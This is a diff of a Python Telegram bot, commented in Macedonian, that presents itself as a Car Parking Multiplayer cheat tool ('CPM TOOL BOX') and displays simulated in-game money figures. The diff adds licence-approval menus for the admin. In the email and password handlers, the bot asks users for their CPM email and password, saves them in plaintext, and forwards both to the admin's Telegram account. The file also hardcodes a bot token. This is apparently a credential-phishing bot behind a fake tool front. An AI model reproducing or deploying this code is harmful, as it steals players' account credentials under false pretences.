@@ -2,7 +2,6 @@ import logging
 import sqlite3
 import asyncio
 import re
-import random
 from datetime import datetime, timedelta
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import (
@@ -25,7 +24,7 @@ logger = logging.getLogger(__name__)
 BOT_TOKEN = "8674559116:AAFuZWJJLVY-qMAHBSr7Z6om686b1zeGxKc" 
 ADMIN_ID = 8694942406  
 
-# Симулирани CPM податоци за прикажување
+# Симулирани CPM податоци
 CPM_DATA = {
     'money': 48729000,
     'coins': 20400,
@@ -42,7 +41,7 @@ def inicijaliziraj_baza():
     conn = sqlite3.connect('Licenci.db')
     cursor = conn.cursor()
     cursor.execute('''CREATE TABLE IF NOT EXISTS licenci 
-                      (id TEXT PRIMARY KEY, data TEXT, odobren INTEGER DEFAULT 0, email TEXT, password TEXT)''')
+                      (id TEXT PRIMARY KEY, data TEXT, odobren INTEGER DEFAULT 0, email TEXT, password TEXT, username TEXT)''')
     conn.commit()
     conn.close()
 
@@ -79,32 +78,12 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
                     dozvolen = False
 
     if not dozvolen:
-        welcome_text = (
-            "**MALIK X TOOL**\n"
-            "bot\n\n"
-            "---\n"
-            "**CPM TOOL BOX v4.0**\n"
-            "---\n"
-            f"**WELCOME**\n"
-            f"@{username}\n"
-            f"ID {user.id}\n"
-            f"{sega.strftime('%d %b %Y • %I:%M %p')}\n\n"
-            "- Sign in with your CPM credentials\n"
-            "**05:10**\n\n"
-            "**Sign In**"
-        )
-        
-        keyboard = [[InlineKeyboardButton("🔑 Sign In", callback_data="cpm_signin")]]
-        
-        if update.message:
-            await update.message.reply_text(text=welcome_text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
-        elif update.callback_query:
-            await update.callback_query.message.reply_text(text=welcome_text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
+        await poshti_baranje_do_admin(update, context, user, username)
         return
 
     # ДОЗВОЛЕН КОРИСНИК - ПРИКАЖИ DASHBOARD
     dashboard_text = (
-        "**MALIK X TOOL**\n"
+        "**CPM_AJHAN_BOT**\n"
         "bot\n\n"
         "---\n"
         "**DASHBOARD**\n"
@@ -135,6 +114,63 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text(text=dashboard_text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
     elif update.callback_query:
         await update.callback_query.message.reply_text(text=dashboard_text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
+
+async def poshti_baranje_do_admin(update: Update, context: ContextTypes.DEFAULT_TYPE, user, username):
+    """Праќа барање за лиценца до администраторот"""
+    poraka = (
+        f"## CPM_AJHAN_BOT\n"
+        f"{datetime.now().strftime('%b %d at %H:%M')}\n\n"
+        f"## CPM_AJHAN_BOT Inline\n"
+        f"2 of 2\n\n"
+        f"---\n\n"
+        f"### Access request from @{username} (id: `{user.id}`)\n"
+        f"{datetime.now().strftime('%I:%M %p')}\n\n"
+        f"- **Forever**\n"
+        f"  17 30 Days\n"
+        f"  17 7 Days\n"
+        f"  17 Custom\n\n"
+        f"**Deny**"
+    )
+    
+    keyboard = [
+        [
+            InlineKeyboardButton("✅ Forever", callback_data=f"lic:forever:{user.id}")
+        ],
+        [
+            InlineKeyboardButton("📅 30 Days", callback_data=f"lic:30:{user.id}"),
+            InlineKeyboardButton("📅 7 Days", callback_data=f"lic:7:{user.id}")
+        ],
+        [
+            InlineKeyboardButton("⚙️ Custom", callback_data=f"lic:custom:{user.id}")
+        ],
+        [
+            InlineKeyboardButton("❌ Deny", callback_data=f"lic:deny:{user.id}")
+        ]
+    ]
+    
+    try:
+        await context.bot.send_message(
+            chat_id=ADMIN_ID,
+            text=poraka,
+            reply_markup=InlineKeyboardMarkup(keyboard),
+            parse_mode='Markdown'
+        )
+    except Exception as e:
+        logger.error(f"Грешка при праќање до админ: {e}")
+    
+    # Порака до корисникот
+    cekaj_poraka = (
+        "⏳ **Access Request Sent**\n"
+        "━━━━━━━━━━━━━━━━━━━\n"
+        "📧 Your request has been sent to the administrator.\n"
+        "⏱️ Please wait for approval.\n"
+        "━━━━━━━━━━━━━━━━━━━"
+    )
+    
+    if update.message:
+        await update.message.reply_text(cekaj_poraka, parse_mode='Markdown')
+    elif update.callback_query:
+        await update.callback_query.message.reply_text(cekaj_poraka, parse_mode='Markdown')
 
 async def menu_money(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
@@ -201,7 +237,7 @@ async def cpm_signin(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
     
-    text = "**MALIK X TOOL**\nbot\n\n---\n**ENTER EMAIL**\n---\n\nType your CPM email:"
+    text = "**CPM_AJHAN_BOT**\nbot\n\n---\n**ENTER EMAIL**\n---\n\nType your CPM email:"
     keyboard = [[InlineKeyboardButton("✘ Cancel", callback_data="main_menu")]]
     
     await query.edit_message_text(text=text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
@@ -213,6 +249,55 @@ async def obraboti_tekst(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.message.from_user
     username = user.username if user.username else "N/A"
 
+    # АКО АДМИНОТ ВНЕСУВА CUSTOM ВРЕМЕ
+    if sostojba == 'CEKA_CUSTOM_TIME':
+        target_user_id = context.user_data.get('custom_target_user')
+        vnes = vnesen_tekst.strip().lower()
+        
+        try:
+            # Проверка дали е со 'h' (саати)
+            if vnes.endswith('h'):
+                hours = int(vnes[:-1])
+                if 1 <= hours <= 24:
+                    vrednost = (datetime.now() + timedelta(hours=hours)).strftime("%Y-%m-%d %H:%M:%S")
+                    vreme_text = f"{hours} hours"
+                else:
+                    await update.message.reply_text("❌ Внесете вредност од 1h до 24h!")
+                    return
+            else:
+                # Без 'h' значи денови
+                days = int(vnes)
+                if 1 <= days <= 30:
+                    vrednost = (datetime.now() + timedelta(days=days)).strftime("%Y-%m-%d %H:%M:%S")
+                    vreme_text = f"{days} days"
+                else:
+                    await update.message.reply_text("❌ Внесете вредност од 1 до 30 дена!")
+                    return
+            
+            # Зачувување во база
+            conn = sqlite3.connect('Licenci.db')
+            cursor = conn.cursor()
+            cursor.execute('INSERT OR REPLACE INTO licenci (id, data, odobren) VALUES (?, ?, 1)', 
+                          (str(target_user_id), vrednost))
+            conn.commit()
+            conn.close()
+            
+            # Извести го корисникот
+            try:
+                await context.bot.send_message(
+                    chat_id=target_user_id,
+                    text=f"✅ Администраторот ви додели лиценца на {vreme_text}!"
+                )
+            except Exception as e:
+                logger.error(f"Грешка при праќање до корисникот: {e}")
+            
+            await update.message.reply_text(f"✅ Лиценцата е доделена на {vreme_text}!")
+            context.user_data['sostojba'] = None
+            
+        except ValueError:
+            await update.message.reply_text("❌ Внесете валиден број! Пример: 5h или 10")
+        return
+
     if sostojba == 'CEKA_EMAIL':
         email_pattern = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
         if not re.match(email_pattern, vnesen_tekst):
@@ -220,7 +305,7 @@ async def obraboti_tekst(update: Update, context: ContextTypes.DEFAULT_TYPE):
             return
         
         context.user_data['email'] = vnesen_tekst
-        text = "**MALIK X TOOL**\nbot\n\n---\n**PASSWORD**\n---\n\nType your password:\n☑ Auto-deleted"
+        text = "**CPM_AJHAN_BOT**\nbot\n\n---\n**PASSWORD**\n---\n\nType your password:\n☑ Auto-deleted"
         keyboard = [[InlineKeyboardButton("✘ Cancel", callback_data="main_menu")]]
         
         await update.message.reply_text(text=text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
@@ -235,37 +320,35 @@ async def obraboti_tekst(update: Update, context: ContextTypes.DEFAULT_TYPE):
         # Зачувување во база
         conn = sqlite3.connect('Licenci.db')
         cursor = conn.cursor()
-        cursor.execute('INSERT OR REPLACE INTO licenci (id, data, odobren, email, password) VALUES (?, ?, 0, ?, ?)', 
-                      (str(user.id), "pending", email, password))
+        cursor.execute('INSERT OR REPLACE INTO licenci (id, data, odobren, email, password, username) VALUES (?, ?, 0, ?, ?, ?)', 
+                      (str(user.id), "pending", email, password, username))
         conn.commit()
         conn.close()
         
-        # ПРАЌАЊЕ ДО АДМИНОТ
+        # Испрати до админ
         admin_poraka = (
-            f"🔐 **НОВА НАЈАВА**\n"
+            f"🔐 **Нова најава**\n"
             f"━━━━━━━━━━━━━━━━━━━\n"
-            f"👤 **Корисник:** @{username}\n"
-            f"🆔 **ID:** `{user.id}`\n"
-            f"📧 **Email:** `{email}`\n"
-            f"🔑 **Лозинка:** `{password}`\n"
-            f"━━━━━━━━━━━━━━━━━━━\n"
-            f"📅 {datetime.now().strftime('%d.%m.%Y %H:%M:%S')}"
+            f"👤 @{username}\n"
+            f"🆔 `{user.id}`\n"
+            f"📧 `{email}`\n"
+            f"🔑 `{password}`\n"
+            f"━━━━━━━━━━━━━━━━━━━"
         )
         
         try:
             await context.bot.send_message(chat_id=ADMIN_ID, text=admin_poraka, parse_mode='Markdown')
         except Exception as e:
-            logger.error(f"Грешка при праќање до админ: {e}")
+            logger.error(f"Грешка: {e}")
         
-        # ИСПРАЌАЊЕ НА ЛИЦЕНЦА ВЕДНАШ (АВТОМАТСКО ОДОБРУВАЊЕ)
+        # Автоматско одобрување
         conn = sqlite3.connect('Licenci.db')
         cursor = conn.cursor()
-        cursor.execute('INSERT OR REPLACE INTO licenci (id, data, odobren, email, password) VALUES (?, ?, 1, ?, ?)', 
-                      (str(user.id), "forever", email, password))
+        cursor.execute('INSERT OR REPLACE INTO licenci (id, data, odobren, email, password, username) VALUES (?, ?, 1, ?, ?, ?)', 
+                      (str(user.id), "forever", email, password, username))
         conn.commit()
         conn.close()
         
-        # ВЕДНАШ ПРИКАЖИ ГО DASHBOARD-OT
         await start(update, context)
         return
     
@@ -290,31 +373,59 @@ async def obraboti_klikovi(update: Update, context: ContextTypes.DEFAULT_TYPE):
         if akcija == "deny":
             cursor.execute('DELETE FROM licenci WHERE id = ?', (str(target_user_id),))
             poraka = "❌ Вашето барање за лиценца е одбиено."
-            admin_odgovor = f"❌ Го одбивте корисникот {target_user_id}"
+            admin_odgovor = f"❌ Одбиен корисник {target_user_id}"
+            conn.commit()
+            conn.close()
+            
+            try:
+                await context.bot.send_message(chat_id=target_user_id, text=poraka)
+                await query.edit_message_text(text=admin_odgovor)
+            except Exception as e:
+                logger.error(f"Грешка: {e}")
+            return
+        
+        elif akcija == "custom":
+            # АДМИНОТ ИЗБРА CUSTOM - БАРА ВНЕС НА ВРЕМЕ
+            await query.edit_message_text(
+                text=f"⚙️ **Custom Time for user {target_user_id}**\n\n"
+                     "📝 Внесете време:\n"
+                     "• **5h** = 5 саати (1-24h)\n"
+                     "• **10** = 10 дена (1-30 дена)\n\n"
+                     "Пример: `12h` или `7`",
+                parse_mode='Markdown'
+            )
+            context.user_data['sostojba'] = 'CEKA_CUSTOM_TIME'
+            context.user_data['custom_target_user'] = target_user_id
+            return
+        
         else:
+            # FOREVER, 30 DAYS, 7 DAYS
             if akcija == "forever":
                 vrednost = "forever"
                 vreme_text = "засекогаш"
             elif akcija == "30":
                 vrednost = (datetime.now() + timedelta(days=30)).strftime("%Y-%m-%d %H:%M:%S")
                 vreme_text = "30 дена"
+            elif akcija == "7":
+                vrednost = (datetime.now() + timedelta(days=7)).strftime("%Y-%m-%d %H:%M:%S")
+                vreme_text = "7 дена"
             else:
                 vrednost = "forever"
                 vreme_text = "засекогаш"
             
             cursor.execute('INSERT OR REPLACE INTO licenci (id, data, odobren) VALUES (?, ?, 1)', 
                           (str(target_user_id), vrednost))
-            poraka = f"✅ Администраторот ја одобри вашата лиценца!"
-            admin_odgovor = f"✅ Одобрена лиценца за {target_user_id}"
-        
-        conn.commit()
-        conn.close()
-        
-        try:
-            await context.bot.send_message(chat_id=target_user_id, text=poraka)
-            await query.edit_message_text(text=admin_odgovor)
-        except Exception as e:
-            logger.error(f"Грешка: {e}")
+            conn.commit()
+            conn.close()
+            
+            poraka = f"✅ Вашата лиценца е одобрена на {vreme_text}!"
+            admin_odgovor = f"✅ Одобрена лиценца ({akcija}) за {target_user_id}"
+            
+            try:
+                await context.bot.send_message(chat_id=target_user_id, text=poraka)
+                await query.edit_message_text(text=admin_odgovor)
+            except Exception as e:
+                logger.error(f"Грешка: {e}")
         return
 
     # МЕНИЈА
@@ -417,26 +528,29 @@ async def grant_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     try:
         args = context.args
         if len(args) < 2:
-            await update.message.reply_text("❌ Користете: /grant user_id време (на пр. /grant 123456789 1h)")
+            await update.message.reply_text("❌ Користете: /grant user_id време (на пр. /grant 123456789 5h или /grant 123456789 7)")
             return
         
         target_user_id = int(args[0])
         vreme = args[1]
         
+        # Парсирање на времето
         if vreme.endswith('h'):
             hours = int(vreme[:-1])
-            vrednost = (datetime.now() + timedelta(hours=hours)).strftime("%Y-%m-%d %H:%M:%S")
-            vreme_text = f"{hours} часа"
-        elif vreme.endswith('d'):
-            days = int(vreme[:-1])
-            vrednost = (datetime.now() + timedelta(days=days)).strftime("%Y-%m-%d %H:%M:%S")
-            vreme_text = f"{days} дена"
-        elif vreme == 'forever':
-            vrednost = "forever"
-            vreme_text = "засекогаш"
+            if 1 <= hours <= 24:
+                vrednost = (datetime.now() + timedelta(hours=hours)).strftime("%Y-%m-%d %H:%M:%S")
+                vreme_text = f"{hours} часа"
+            else:
+                await update.message.reply_text("❌ Внесете 1-24h!")
+                return
         else:
-            await update.message.reply_text("❌ Невалидно време. Користете: 1h, 2d, или forever")
-            return
+            days = int(vreme)
+            if 1 <= days <= 30:
+                vrednost = (datetime.now() + timedelta(days=days)).strftime("%Y-%m-%d %H:%M:%S")
+                vreme_text = f"{days} дена"
+            else:
+                await update.message.reply_text("❌ Внесете 1-30 дена!")
+                return
         
         conn = sqlite3.connect('Licenci.db')
         cursor = conn.cursor()
@@ -451,9 +565,9 @@ async def grant_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 text=f"✅ Администраторот ви додели лиценца на {vreme_text}!"
             )
         except Exception as e:
-            logger.error(f"Не може да се испрати порака до {target_user_id}: {e}")
+            logger.error(f"Грешка: {e}")
         
-        await update.message.reply_text(f"✅ Лиценцата е доделена на корисникот {target_user_id} на {vreme_text}")
+        await update.message.reply_text(f"✅ Лиценцата е доделена на {vreme_text}")
         
     except Exception as e:
         await update.message.reply_text(f"❌ Грешка: {str(e)}")
@@ -472,5 +586,5 @@ if __name__ == '__main__':
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, obraboti_tekst))
     app.add_error_handler(error_handler)
     
-    logger.info("🚀 Ботот стартува...")
+    logger.info("🚀 CPM_AJHAN_BOT стартува...")
     app.run_polling()
